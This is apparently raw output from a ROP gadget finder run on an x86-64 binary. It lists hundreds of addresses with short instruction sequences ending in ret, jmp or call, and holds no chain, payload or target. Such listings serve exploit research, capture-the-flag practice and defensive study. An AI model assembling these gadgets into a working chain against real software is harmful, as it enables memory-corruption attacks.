0x00000000004a962b : cmp al, 0x93 ; in al, dx ; retf 0xae32
0x000000000045ac61 : cmp al, 0xb3 ; add rdi, r11 ; jmp rdi
0x000000000040d639 : cmp al, 0xba ; add rdi, r10 ; jmp rdi
0x0000000000494de1 : cmp al, 0xfa ; jmp qword ptr [rdx]
0x0000000000494d25 : cmp al, 0xfa ; jmp rax
0x0000000000476459 : cmp al, 0xfd ; dec dword ptr [rax + 0x39] ; ret
0x000000000044bf3d : cmp al, 0xff ; dec dword ptr [rax - 0x7f] ; ret
0x00000000004915d6 : cmp al, byte ptr [rdx - 0x76b7ffde] ; ret 0x8348
0x0000000000446e36 : cmp al, byte ptr [rsi - 1] ; jne 0x446e5c ; xor eax, eax ; ret
0x000000000042bca6 : cmp al, dh ; ret
0x000000000042bca5 : cmp al, r14b ; ret
0x000000000048b076 : cmp bh, 0x10 ; jne 0x48b09f ; xor eax, eax ; ret
0x000000000048e216 : cmp bh, 0x10 ; jne 0x48e235 ; xor eax, eax ; ret
0x000000000048f076 : cmp bh, 0x10 ; jne 0x48f095 ; xor eax, eax ; ret
0x000000000048fae6 : cmp bh, 0x10 ; jne 0x48fb0f ; xor eax, eax ; ret
0x000000000048e1fc : cmp bh, 0x30 ; jne 0x48e231 ; mov rax, qword ptr [rsi + 0x10] ; ret
0x000000000048f05c : cmp bh, 0x30 ; jne 0x48f091 ; mov rax, qword ptr [rsi + 0x10] ; ret
0x0000000000494eb5 : cmp bh, dl ; call rsp
0x0000000000494eb1 : cmp bh, dl ; inc dword ptr [rdx + rdi - 6] ; call rsp
0x0000000000494d35 : cmp bh, dl ; jmp qword ptr [rax]
0x00000000004112a2 : cmp byte ptr [r8 - 0x75], cl ; push rbx ; adc byte ptr [rax + 1], cl ; ret 0x2b48
0x0000000000412c5f : cmp byte ptr [rax + 0x29], cl ; ret
0x0000000000476e63 : cmp byte ptr [rax + 0x29], cl ; ret 0x8d49
0x0000000000410cfe : cmp byte ptr [rax + 0x39], cl ; ret
0x0000000000413709 : cmp byte ptr [rax + 0x39], cl ; ret 0x2175
0x000000000040178b : cmp byte ptr [rax + 0x39], cl ; ret 0x4f76
0x00000000004829be : cmp byte ptr [rax + 0x39], cl ; retf
0x000000000042bce7 : cmp byte ptr [rax + 1], cl ; clc ; ret
0x0000000000470655 : cmp byte ptr [rax + 1], cl ; ret
0x00000000004700e0 : cmp byte ptr [rax + 1], cl ; ror byte ptr [rax + 0x39], cl ; ret 0xf48
0x0000000000458e9f : cmp byte ptr [rax - 0x3f], cl ; retf 0x6411
0x000000000045b8c7 : cmp byte ptr [rax - 0x73], cl ; dec dword ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x148
0x0000000000451a98 : cmp byte ptr [rax - 0x75], cl ; and al, 0x18 ; call rax
0x000000000045ba44 : cmp byte ptr [rax - 0x75], cl ; jl 0x45ba75 ; and byte ptr [rax + 1], cl ; ret
0x00000000004112a3 : cmp byte ptr [rax - 0x75], cl ; push rbx ; adc byte ptr [rax + 1], cl ; ret 0x2b48
0x000000000047e2e9 : cmp byte ptr [rax - 0x77], cl ; retf
0x0000000000411b30 : cmp byte ptr [rax - 0x77], cl ; retf 0x775
0x000000000046fe86 : cmp byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax - 0x77] ; ret 0xf41
0x00000000004533a4 : cmp byte ptr [rax - 0x7d], cl ; ret 0x4804
0x000000000042bcd6 : cmp byte ptr [rax], ah ; ret
0x00000000004173a3 : cmp byte ptr [rax], al ; je 0x4173b5 ; ret
0x000000000048d1ff : cmp byte ptr [rax], al ; je 0x48d228 ; add rsp, 0x18 ; ret
0x0000000000447422 : cmp byte ptr [rax], al ; retf 0xf66
0x0000000000440a50 : cmp byte ptr [rax], dh ; cmovne rax, rdx ; ret
0x000000000042bcc6 : cmp byte ptr [rax], dl ; ret
0x000000000042bcc5 : cmp byte ptr [rax], r10b ; ret
0x000000000042bcd5 : cmp byte ptr [rax], r12b ; ret
0x0000000000440a4f : cmp byte ptr [rax], sil ; cmovne rax, rdx ; ret
0x00000000004af9c8 : cmp byte ptr [rbp - 7], cl ; jmp qword ptr [rbx]
0x00000000004b4149 : cmp byte ptr [rbx + 0x2030d07], al ; cld ; ret
0x00000000004b417d : cmp byte ptr [rbx + 0x2030d07], al ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00000000004b4115 : cmp byte ptr [rbx + 0x3030d07], al ; or al, byte ptr [rcx] ; ret
0x000000000048ad18 : cmp byte ptr [rbx + 0x41], bl ; pop rsi ; ret
0x000000000040db86 : cmp byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x0000000000416a20 : cmp byte ptr [rbx + 0x5d], bl ; ret
0x0000000000495a9c : cmp byte ptr [rbx + rdi*8 - 1], al ; or al, byte ptr [rbx + rdi*8 - 1] ; ret 0xfb43
0x00000000004acefc : cmp byte ptr [rbx - 0x1ff1b5f9], al ; add dword ptr [rdx], eax ; retf
0x0000000000494f28 : cmp byte ptr [rbx], 0xfa ; call qword ptr [rax]
0x0000000000471a60 : cmp byte ptr [rcx + 0x5d5b7453], cl ; pop r12 ; ret
0x000000000048d2fb : cmp byte ptr [rcx + rsi], 8 ; jne 0x48d30e ; mov qword ptr [rax], rdx ; ret
0x000000000040403b : cmp byte ptr [rcx - 0x75], al ; push rdi ; adc al, 0xf ; retf 0xfa83
0x0000000000458bc7 : cmp byte ptr [rcx - 0x77], cl ; push rsi ; sub byte ptr [rax - 0x3f], cl ; retf
0x00000000004801b6 : cmp byte ptr [rcx - 0x7d], cl ; ret 0x4908
0x00000000004b0a94 : cmp byte ptr [rcx], dl ; add byte ptr [rax], ch ; loopne 0x4b0a9b ; call qword ptr [rax]
0x00000000004ab3a2 : cmp byte ptr [rdi], 0 ; add byte ptr [rax + 0x40], al ; mov bl, bh ; std ; jmp rax
0x0000000000417368 : cmp byte ptr [rdi], cl ; ret 0x389
0x000000000042d5cd : cmp byte ptr [rdi], dl ; ret
0x000000000042e0e0 : cmp byte ptr [rdi], dl ; ret 0x2373
0x000000000042e0c9 : cmp byte ptr [rdi], dl ; ret 0x3a73
0x000000000042e0b2 : cmp byte ptr [rdi], dl ; ret 0x5173
0x000000000042cb6e : cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000048d28c : cmp byte ptr [rdx + rsi], 8 ; jne 0x48d2b5 ; mov rax, qword ptr [rax] ; ret
0x00000000004b3408 : cmp byte ptr [rdx], ah ; cld ; jmp qword ptr [rcx]
0x0000000000494d10 : cmp byte ptr [rsi], 0xfa ; call qword ptr [rax]
0x000000000048c834 : cmp cl, 0xff ; dec dword ptr [rcx + 0x31] ; retf 0x8948
0x0000000000488df2 : cmp cl, byte ptr [rax - 0x7d] ; ret 0xf08
0x000000000042e7b1 : cmp cl, byte ptr [rdi] ; retf 0x6601
0x000000000042e901 : cmp cl, byte ptr [rdi] ; retf 0x6602
0x000000000042ea51 : cmp cl, byte ptr [rdi] ; retf 0x6603
0x000000000042eba1 : cmp cl, byte ptr [rdi] ; retf 0x6604
0x000000000042ecf1 : cmp cl, byte ptr [rdi] ; retf 0x6605
0x000000000042ee41 : cmp cl, byte ptr [rdi] ; retf 0x6606
0x000000000042ef91 : cmp cl, byte ptr [rdi] ; retf 0x6607
0x000000000042f0e1 : cmp cl, byte ptr [rdi] ; retf 0x6608
0x000000000042f231 : cmp cl, byte ptr [rdi] ; retf 0x6609
0x000000000042f381 : cmp cl, byte ptr [rdi] ; retf 0x660a
0x000000000042f4d1 : cmp cl, byte ptr [rdi] ; retf 0x660b
0x000000000042f621 : cmp cl, byte ptr [rdi] ; retf 0x660c
0x000000000042f771 : cmp cl, byte ptr [rdi] ; retf 0x660d
0x000000000042f8c1 : cmp cl, byte ptr [rdi] ; retf 0x660e
0x000000000042fa11 : cmp cl, byte ptr [rdi] ; retf 0x660f
0x00000000004339ea : cmp cl, byte ptr [rdi] ; retf 0xf01
0x0000000000433b6a : cmp cl, byte ptr [rdi] ; retf 0xf02
0x0000000000433cea : cmp cl, byte ptr [rdi] ; retf 0xf03
0x0000000000433e6a : cmp cl, byte ptr [rdi] ; retf 0xf04
0x0000000000433fea : cmp cl, byte ptr [rdi] ; retf 0xf05
0x000000000043416a : cmp cl, byte ptr [rdi] ; retf 0xf06
0x00000000004342ea : cmp cl, byte ptr [rdi] ; retf 0xf07
0x000000000043446a : cmp cl, byte ptr [rdi] ; retf 0xf08
0x00000000004345ea : cmp cl, byte ptr [rdi] ; retf 0xf09
0x000000000043476a : cmp cl, byte ptr [rdi] ; retf 0xf0a
0x00000000004348ea : cmp cl, byte ptr [rdi] ; retf 0xf0b
0x0000000000434a6a : cmp cl, byte ptr [rdi] ; retf 0xf0c
0x0000000000434bea : cmp cl, byte ptr [rdi] ; retf 0xf0d
0x0000000000434d6a : cmp cl, byte ptr [rdi] ; retf 0xf0e
0x0000000000434eea : cmp cl, byte ptr [rdi] ; retf 0xf0f
0x00000000004a9a06 : cmp cl, byte ptr [rsi] ; and byte ptr [rbx + 0x3d], bh ; retf
0x00000000004048f7 : cmp cl, ch ; ret 0xfffb
0x0000000000440eb1 : cmp dh, byte ptr [rax] ; cmovne rax, rdx ; vzeroupper ; ret
0x000000000044892a : cmp dh, byte ptr [rdx + 2] ; mov byte ptr [rdi], cl ; vzeroupper ; ret
0x000000000048b075 : cmp dil, 0x10 ; jne 0x48b0a0 ; xor eax, eax ; ret
0x000000000048e215 : cmp dil, 0x10 ; jne 0x48e236 ; xor eax, eax ; ret
0x000000000048f075 : cmp dil, 0x10 ; jne 0x48f096 ; xor eax, eax ; ret
0x000000000048fae5 : cmp dil, 0x10 ; jne 0x48fb10 ; xor eax, eax ; ret
0x00000000004485f0 : cmp dl, 1 ; ja 0x448613 ; jb 0x448602 ; mov byte ptr [rdi], cl ; ret
0x0000000000438e7b : cmp dl, 1 ; jb 0x438e8d ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00000000004475ea : cmp dl, 1 ; jb 0x4475f8 ; mov byte ptr [rdi], cl ; ret
0x0000000000423715 : cmp dl, al ; jne 0x423708 ; sub rax, 0x10 ; ret
0x00000000004949fc : cmp dl, byte ptr [rbx] ; cli ; jmp rax
0x0000000000423714 : cmp dl, r8b ; jne 0x423709 ; sub rax, 0x10 ; ret
0x0000000000471a08 : cmp dword ptr [rax + 0x30], 0 ; je 0x471a17 ; ret
0x000000000042a5c7 : cmp dword ptr [rax + rax], eax ; add byte ptr [rbp - 0x77], cl ; retf
0x000000000042ada7 : cmp dword ptr [rax + rax], ecx ; add byte ptr [rbp - 0x77], cl ; retf
0x000000000040eb51 : cmp dword ptr [rax - 0x39], ecx ; ret
0x0000000000435108 : cmp dword ptr [rbx - 1], -1 ; dec dword ptr [rax - 0x7f] ; ret 0x80
0x00000000004173a1 : cmp dword ptr [rdi + 0x38], 0 ; je 0x4173b7 ; ret
0x0000000000424eb1 : cmp dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x000000000047fa3f : cmp eax, -1 ; cmove rax, rdx ; ret
0x0000000000471a26 : cmp eax, -1 ; je 0x471a39 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000481bac : cmp eax, -3 ; jbe 0x481bbe ; ret
0x0000000000487905 : cmp eax, 0x23166d ; add byte ptr [rbp + 2], dh ; pop rbx ; ret
0x0000000000460f19 : cmp eax, 0x255802 ; mov rax, qword ptr [rdi + rax*8] ; jmp rax
0x000000000044ea93 : cmp eax, 0x26b754 ; je 0x44ea51 ; call 0x45b539
0x00000000004131b2 : cmp eax, 0x2a5df0 ; add byte ptr [rdx + rax - 0xd], dh ; ret
0x000000000040392a : cmp eax, 0x2b5630 ; add byte ptr [rax - 0x77], cl ; ret
0x000000000047fd58 : cmp eax, 0x31 ; jbe 0x47fdc8 ; call qword ptr [rip + 0x23cafd]
0x0000000000494ddd : cmp eax, 0x3c92fffa ; cli ; jmp qword ptr [rdx]
0x0000000000494f15 : cmp eax, 0x3d40fffa ; cli ; call rax
0x0000000000494e95 : cmp eax, 0x3d54fffa ; cli ; jmp rsp
0x0000000000494d55 : cmp eax, 0x3d86fffa ; cli ; call qword ptr [rsi]
0x000000000044b052 : cmp eax, 0x7d8b48 ; call r12
0x000000000044cdaf : cmp eax, 0x83482f74 ; ret
0x000000000044cbd6 : cmp eax, 0x83497174 ; ret
0x0000000000473674 : cmp eax, 0x89000001 ; ret 0x8948
0x000000000044deeb : cmp eax, 0x890026df ; ret 0xe083
0x0000000000455742 : cmp eax, 0x89fffff3 ; retf 0xe283
0x00000000004a6f2b : cmp eax, 0xaf6a2574 ; xlatb ; out 0xb3, al ; retf 0xe80
0x0000000000449ef6 : cmp eax, 0xfffff000 ; ja 0x449f08 ; ret
0x0000000000449f44 : cmp eax, 0xfffff000 ; ja 0x449f58 ; ret
0x000000000044a14f : cmp eax, 0xfffff000 ; ja 0x44a1b8 ; ret
0x000000000044a1e5 : cmp eax, 0xfffff000 ; ja 0x44a1f8 ; ret
0x000000000044a222 : cmp eax, 0xfffff000 ; ja 0x44a288 ; ret
0x000000000044a2b8 : cmp eax, 0xfffff000 ; ja 0x44a2d0 ; ret
0x000000000044a2e8 : cmp eax, 0xfffff000 ; ja 0x44a300 ; ret
0x000000000044a4f2 : cmp eax, 0xfffff000 ; ja 0x44a540 ; ret
0x000000000044a568 : cmp eax, 0xfffff000 ; ja 0x44a580 ; ret
0x000000000044acc1 : cmp eax, 0xfffff000 ; ja 0x44acd8 ; ret
0x000000000045b84e : cmp eax, 0xfffff000 ; ja 0x45b868 ; ret
0x00000000004756c6 : cmp eax, 0xfffff000 ; ja 0x4756d8 ; ret
0x000000000047571a : cmp eax, 0xfffff000 ; ja 0x475730 ; ret
0x00000000004498e8 : cmp eax, 0xfffff001 ; jae 0x4498f7 ; ret
0x0000000000449e68 : cmp eax, 0xfffff001 ; jae 0x449e77 ; ret
0x000000000044aef8 : cmp eax, 0xfffff001 ; jae 0x44af07 ; ret
0x000000000044af28 : cmp eax, 0xfffff001 ; jae 0x44af37 ; ret
0x000000000044af58 : cmp eax, 0xfffff001 ; jae 0x44af67 ; ret
0x000000000044c5fb : cmp eax, 0xfffff001 ; jae 0x44c60a ; ret
0x000000000044c628 : cmp eax, 0xfffff001 ; jae 0x44c637 ; ret
0x0000000000475648 : cmp eax, 0xfffff001 ; jae 0x475657 ; ret
0x00000000004886b8 : cmp eax, 0xfffff001 ; jae 0x4886c7 ; ret
0x0000000000448fab : cmp eax, 2 ; je 0x448fbf ; xor eax, eax ; ret
0x000000000044c76a : cmp eax, 4 ; je 0x44c775 ; ret
0x00000000004a8df7 : cmp eax, dword ptr [rsi] ; rcl qword ptr [r14 + 0x27], cl ; retf 0xc0fe
0x000000000046f4db : cmp eax, ecx ; jg 0x46f4f8 ; add eax, edi ; mov rdx, r8 ; jmp 0x46f4b7
0x000000000044743f : cmp eax, ecx ; jle 0x44747f ; movsxd rax, ecx ; ret
0x0000000000446e53 : cmp eax, ecx ; sbb eax, eax ; sbb eax, -1 ; ret
0x00000000004190ab : cmp eax, edx ; jae 0x4190d7 ; movzx eax, byte ptr [rax] ; ret
0x0000000000487e34 : cmp eax, esi ; je 0x487e45 ; ret
0x0000000000462fff : cmp eax, esp ; je 0x462e36 ; jmp 0x462fd4
0x000000000046f4da : cmp eax, r9d ; jg 0x46f4f9 ; add eax, edi ; mov rdx, r8 ; jmp 0x46f4b8
0x0000000000456dec : cmp ebp, ebx ; jb 0x456e5e ; mov rdx, rax ; jmp 0x456db5
0x000000000044c706 : cmp ebx, 0xa ; je 0x44c711 ; ret
0x000000000044dd1e : cmp ebx, eax ; setne dl ; jmp 0x44dd0a
0x0000000000473d95 : cmp ecx, 0xc00 ; je 0x473da9 ; ret
0x000000000044c931 : cmp ecx, dword ptr [rax + 0x10] ; jae 0x44c926 ; ret
0x000000000048726e : cmp ecx, dword ptr [rax - 0x3f] ; loop 0x48727f ; add rdx, rax ; jmp 0x487288
0x00000000004900eb : cmp ecx, dword ptr [rax - 0x75] ; imul ebx, dword ptr [rax], -0x18 ; retf
0x0000000000482678 : cmp ecx, dword ptr [rax - 0x77] ; retf 0xfe8
0x000000000044f222 : cmp ecx, dword ptr [rax - 0x7d] ; ret
0x000000000047fa88 : cmp ecx, dword ptr [rdi + rsi] ; jae 0x47fa38 ; xor eax, eax ; ret
0x0000000000471fce : cmp ecx, dword ptr [rdx + 0x4c] ; cmove eax, ecx ; ret
0x000000000042e0fb : cmp ecx, eax ; jne 0x42e129 ; xor eax, eax ; ret
0x000000000047e818 : cmp ecx, eax ; jne 0x47e7c2 ; mov eax, dword ptr [rdx + 4] ; ret
0x00000000004843d2 : cmp ecx, ecx ; ret
0x0000000000471d3a : cmp ecx, esi ; jne 0x471d37 ; lea eax, [rdx + rdi] ; ret
0x000000000047e806 : cmp ecx, esi ; jne 0x47e7e5 ; ret
0x0000000000465f70 : cmp edi, eax ; ja 0x465f57 ; mov eax, r9d ; ret
0x000000000047f473 : cmp edi, ecx ; and eax, dword ptr [rax] ; add rsp, 8 ; ret
0x0000000000494d31 : cmp edi, edx ; call qword ptr [rax + 0x20fffa3a]
0x0000000000494f29 : cmp edi, edx ; call qword ptr [rax]
0x0000000000494ded : cmp edi, edx ; call rdx
0x0000000000494de9 : cmp edi, edx ; inc dword ptr [rdx + 0x3b] ; cli ; call rdx
0x0000000000475a3e : cmp edi, edx ; ja 0x475a6d ; ret
0x00000000004477f2 : cmp edi, edx ; jb 0x4477ff ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000494d6d : cmp edi, edx ; jmp rsi
0x0000000000465f6f : cmp edi, r8d ; ja 0x465f58 ; mov eax, r9d ; ret
0x000000000041ff5a : cmp edx, eax ; jne 0x41ff25 ; ret
0x00000000004485db : cmp edx, ecx ; jne 0x4485c8 ; ret
0x0000000000448742 : cmp edx, ecx ; jne 0x44872e ; vzeroupper ; ret
0x0000000000448905 : cmp edx, ecx ; jne 0x4488e9 ; vzeroupper ; ret
0x0000000000494d01 : cmp edx, edi ; call rax
0x000000000044c68a : cmp edx, edi ; setae al ; ret
0x00000000004744a6 : cmp edx, esi ; je 0x4744b7 ; test edx, edx ; jne 0x4744a9 ; ret
0x00000000004190e9 : cmp esi, -1 ; setne al ; neg eax ; ret
0x0000000000459014 : cmp esi, 3 ; je 0x459026 ; ret
0x0000000000447bd5 : cmp esi, dword ptr [rdx + 5] ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00000000004a8fc4 : cmp esi, ebp ; xlatb ; ret 0x4e27
0x000000000041830a : cmp esi, ecx ; jne 0x418307 ; lea eax, [rdx + rdi] ; ret
0x0000000000471a07 : cmp qword ptr [rax + 0x30], 0 ; je 0x471a18 ; ret
0x00000000004173a0 : cmp qword ptr [rdi + 0x38], 0 ; je 0x4173b8 ; ret
0x000000000044c705 : cmp r11d, 0xa ; je 0x44c712 ; ret
0x0000000000456deb : cmp r13, r11 ; jb 0x456e5f ; mov rdx, rax ; jmp 0x456db6
0x0000000000494eb4 : cmp r15b, dl ; call rsp
0x0000000000449ef5 : cmp rax, -0x1000 ; ja 0x449f09 ; ret
0x0000000000449f43 : cmp rax, -0x1000 ; ja 0x449f59 ; ret
0x000000000044a14e : cmp rax, -0x1000 ; ja 0x44a1b9 ; ret
0x000000000044a1e4 : cmp rax, -0x1000 ; ja 0x44a1f9 ; ret
0x000000000044a221 : cmp rax, -0x1000 ; ja 0x44a289 ; ret
0x000000000044a2b7 : cmp rax, -0x1000 ; ja 0x44a2d1 ; ret
0x000000000044a2e7 : cmp rax, -0x1000 ; ja 0x44a301 ; ret
0x000000000044a4f1 : cmp rax, -0x1000 ; ja 0x44a541 ; ret
0x000000000044a567 : cmp rax, -0x1000 ; ja 0x44a581 ; ret
0x000000000044acc0 : cmp rax, -0x1000 ; ja 0x44acd9 ; ret
0x000000000045b84d : cmp rax, -0x1000 ; ja 0x45b869 ; ret
0x00000000004756c5 : cmp rax, -0x1000 ; ja 0x4756d9 ; ret
0x0000000000475719 : cmp rax, -0x1000 ; ja 0x475731 ; ret
0x00000000004498e7 : cmp rax, -0xfff ; jae 0x4498f8 ; ret
0x0000000000449e67 : cmp rax, -0xfff ; jae 0x449e78 ; ret
0x000000000044aef7 : cmp rax, -0xfff ; jae 0x44af08 ; ret
0x000000000044af27 : cmp rax, -0xfff ; jae 0x44af38 ; ret
0x000000000044af57 : cmp rax, -0xfff ; jae 0x44af68 ; ret
0x000000000044c5fa : cmp rax, -0xfff ; jae 0x44c60b ; ret
0x000000000044c627 : cmp rax, -0xfff ; jae 0x44c638 ; ret
0x0000000000475647 : cmp rax, -0xfff ; jae 0x475658 ; ret
0x00000000004886b7 : cmp rax, -0xfff ; jae 0x4886c8 ; ret
0x000000000047fa3e : cmp rax, -1 ; cmove rax, rdx ; ret
0x0000000000481bab : cmp rax, -3 ; jbe 0x481bbf ; ret
0x000000000047fd57 : cmp rax, 0x31 ; jbe 0x47fdc9 ; call qword ptr [rip + 0x23cafd]
0x00000000004190aa : cmp rax, rdx ; jae 0x4190d8 ; movzx eax, byte ptr [rax] ; ret
0x0000000000487e33 : cmp rax, rsi ; je 0x487e46 ; ret
0x000000000044c930 : cmp rcx, qword ptr [rax + 0x10] ; jae 0x44c927 ; ret
0x000000000047fa87 : cmp rcx, qword ptr [rdi + rsi] ; jae 0x47fa39 ; xor eax, eax ; ret
0x0000000000471fcd : cmp rcx, qword ptr [rdx + 0x4c] ; cmove eax, ecx ; ret
0x000000000047e817 : cmp rcx, r8 ; jne 0x47e7c3 ; mov eax, dword ptr [rdx + 4] ; ret
0x000000000042e0fa : cmp rcx, rax ; jne 0x42e12a ; xor eax, eax ; ret
0x0000000000471d39 : cmp rcx, rsi ; jne 0x471d38 ; lea eax, [rdx + rdi] ; ret
0x000000000047e805 : cmp rcx, rsi ; jne 0x47e7e6 ; ret
0x0000000000475a3d : cmp rdi, rdx ; ja 0x475a6e ; ret
0x00000000004477f1 : cmp rdi, rdx ; jb 0x447800 ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000494d00 : cmp rdx, r15 ; call rax
0x000000000041ff59 : cmp rdx, r8 ; jne 0x41ff26 ; ret
0x00000000004485da : cmp rdx, rcx ; jne 0x4485c9 ; ret
0x00000000004485d9 : cmp rdx, rcx ; jne 0x4485ca ; ret
0x0000000000448741 : cmp rdx, rcx ; jne 0x44872f ; vzeroupper ; ret
0x0000000000448904 : cmp rdx, rcx ; jne 0x4488ea ; vzeroupper ; ret
0x000000000044c689 : cmp rdx, rdi ; setae al ; ret
0x0000000000418309 : cmp rsi, rcx ; jne 0x418308 ; lea eax, [rdx + rdi] ; ret
0x000000000042db79 : cmpsb byte ptr [rsi], byte ptr [rdi] ; add eax, 0xc0310000 ; ret
0x000000000049530d : cmpsb byte ptr [rsi], byte ptr [rdi] ; cli ; jmp rax
0x000000000044c876 : cmpsb byte ptr [rsi], byte ptr [rdi] ; jmp qword ptr [rsi]
0x000000000040058c : cmpsb byte ptr [rsi], byte ptr [rdi] ; jne 0x400595 ; ret
0x00000000004a6ff6 : cmpsb byte ptr [rsi], byte ptr [rdi] ; jne 0x4a6fc2 ; mov ecx, 0x5b92ac50 ; retf
0x000000000043e866 : cmpsb byte ptr [rsi], byte ptr [rdi] ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004a9111 : cmpsb byte ptr [rsi], byte ptr [rdi] ; out dx, al ; or eax, 0xe6d46ec6 ; mov bh, 0x4e ; retf 0x9d7d
0x0000000000419fc2 : cmpsb byte ptr [rsi], byte ptr [rdi] ; sbb eax, 0x2a ; add byte ptr [rax], al ; ret
0x00000000004945d5 : cmpsb byte ptr [rsi], byte ptr [rdi] ; stc ; call qword ptr [rax - 0x1f000659]
0x000000000041d6fd : cmpsd dword ptr [rsi], dword ptr [rdi] ; add eax, 0x83480000 ; retf 0x4901
0x000000000047cb58 : cmpsd dword ptr [rsi], dword ptr [rdi] ; add rax, rdi ; jmp rax
0x000000000046ca59 : cmpsd dword ptr [rsi], dword ptr [rdi] ; and al, 0 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x00000000004111d9 : cmpsd dword ptr [rsi], dword ptr [rdi] ; cwde ; add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; retf 0x830f
0x000000000044e175 : cmpsd dword ptr [rsi], dword ptr [rdi] ; fsub qword ptr [rsi] ; add al, ch ; ret 0xfde1
0x00000000004a6adf : cmpsd dword ptr [rsi], dword ptr [rdi] ; mov bx, 0xf32d ; retf
0x00000000004945d9 : cmpsd dword ptr [rsi], dword ptr [rdi] ; stc ; jmp rax
0x00000000004959b4 : cmpsd dword ptr [rsi], dword ptr [rdi] ; sti ; ljmp [rax + 0x43] ; sti ; jmp qword ptr [rcx]
0x0000000000400b09 : cmpsd dword ptr [rsi], dword ptr [rdi] ; sub eax, dword ptr [rax] ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000048b0f0 : cwde ; add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x830f
0x000000000041a99c : cwde ; add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x840f
0x000000000048b185 : cwde ; add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x9272
0x00000000004111da : cwde ; add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; retf 0x830f
0x0000000000451f9f : cwde ; add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret
0x000000000049218c : cwde ; add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x11], cl ; call rax
0x00000000004918ec : cwde ; add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 1], cl ; call rax
0x00000000004abf09 : cwde ; cmc ; call rax
0x00000000004b5d58 : cwde ; cwde ; std ; call qword ptr [rdx]
0x00000000004b2df4 : cwde ; je 0x4b2dfe ; add al, bh ; cli ; sti ; jmp qword ptr [rbx]
0x0000000000494399 : cwde ; stc ; call qword ptr [rcx + 0x11fff998]
0x000000000049439d : cwde ; stc ; call qword ptr [rcx]
0x0000000000494461 : cwde ; stc ; inc dword ptr [rax - 0x67] ; stc ; call rax
0x00000000004b0011 : cwde ; stc ; jmp qword ptr [rcx]
0x00000000004b5d59 : cwde ; std ; call qword ptr [rdx]
0x0000000000442b51 : dec byte ptr [r8 + 0x29] ; ret 0x280f
0x0000000000442b52 : dec byte ptr [rax + 0x29] ; ret 0x280f
0x000000000044811d : dec byte ptr [rax + 0x7f] ; jl 0x448142 ; cld ; vzeroupper ; ret
0x000000000045dd89 : dec byte ptr [rax - 0x75] ; mov ebp, 0xfffff758 ; call rax
0x0000000000480e8f : dec byte ptr [rax - 0x77] ; fisttp word ptr [rax - 0x77] ; ret 0xde8
0x0000000000472820 : dec byte ptr [rax - 0x77] ; ret
0x0000000000480e2d : dec byte ptr [rax - 0x7d] ; ret
0x000000000044b1a2 : dec byte ptr [rbx + rcx*4 + 0x5f] ; or byte ptr [rcx - 0xa], al ; ret
0x000000000040e4f6 : dec byte ptr [rcx + 0xf] ; scasd eax, dword ptr [rdi] ; ret
0x000000000044b833 : dec byte ptr [rcx + rcx*4 + 0x42] ; adc byte ptr [rax + 9], cl ; retf 0x8948
0x00000000004741f6 : dec byte ptr [rcx + rcx*4 - 0x11] ; add r15, r12 ; call 0x400499
0x000000000040e0a7 : dec byte ptr [rcx + rcx*4 - 0x11] ; mov rax, qword ptr [rsp + 8] ; call rax
0x0000000000481ba9 : dec dword ptr [r8 - 0x7d] ; clc ; std ; jbe 0x481bc1 ; ret
0x0000000000457193 : dec dword ptr [r8 - 0x7d] ; ret 0x8801
0x0000000000414d8e : dec dword ptr [rax + 0x21] ; retf 0x2148
0x0000000000411b6d : dec dword ptr [rax + 0x29] ; ret
0x0000000000442c92 : dec dword ptr [rax + 0x29] ; ret 0x280f
0x0000000000482b71 : dec dword ptr [rax + 0x29] ; ret 0x8948
0x0000000000482cb1 : dec dword ptr [rax + 0x29] ; ret 0x894c
0x000000000041efe5 : dec dword ptr [rax + 0x29] ; ret 0x8d4c
0x000000000047645b : dec dword ptr [rax + 0x39] ; ret
0x000000000041399d : dec dword ptr [rax + 0x39] ; ret 0x860f
0x0000000000489359 : dec dword ptr [rax + 0x39] ; ret 0xf48
0x000000000041e385 : dec dword ptr [rax + 0x39] ; retf 0x2a74
0x000000000041e357 : dec dword ptr [rax + 0x39] ; retf 0x4b74
0x000000000048486e : dec dword ptr [rax + 0x48e57506] ; mov eax, esi ; ret
0x000000000045eebc : dec dword ptr [rax + 0x63] ; retf
0x000000000046eef2 : dec dword ptr [rax + 0xf] ; add dword ptr [r8 - 0x7d], ecx ; ret 0x8502
0x0000000000473609 : dec dword ptr [rax + 0xf] ; mov ebp, 0xf80148c6 ; ret
0x000000000047fa41 : dec dword ptr [rax + 0xf] ; ret 0x66c3
0x0000000000424071 : dec dword ptr [rax + 0xf] ; ret 0x8348
0x0000000000473db9 : dec dword ptr [rax + 0xf] ; ret 0x90c3
0x000000000045b8cb : dec dword ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x148
0x0000000000472971 : dec dword ptr [rax + 1] ; ret
0x0000000000403103 : dec dword ptr [rax - 0x39] ; ret
0x0000000000449def : dec dword ptr [rax - 0x39] ; ret 0
0x0000000000449d94 : dec dword ptr [rax - 0x39] ; ret 0x8000
0x000000000045ddf0 : dec dword ptr [rax - 0x39] ; ret 0xac20
0x0000000000449d07 : dec dword ptr [rax - 0x39] ; ret 0xff80
0x0000000000468aa6 : dec dword ptr [rax - 0x39] ; ret 0xffa0
